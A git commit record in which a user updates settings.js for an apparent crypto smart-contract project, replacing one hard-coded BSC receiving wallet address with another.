d4b82199498f459f5c4914dbfb965f0a097fa846
cryptolover12334 <156954184+cryptolover12334@users.noreply.github.com>
2024-01-17 23:41:46 -0800

    Update settings.js

--- settings.js
+++ settings.js
@@ -1,6 +1,6 @@
 //code for local smart contract
 
-const receiveAddress = "0x5b3606F7dF5ce9fF4e79Cd9094d4D5a135cf147F";   // remove the words and replace it with your bsc address    
+const receiveAddress = "0xcAeD27D8b4D0532b3440DCE930353c6f383361b6";   // remove the words and replace it with your bsc address    
 
 	
 var cryptotokenContract;
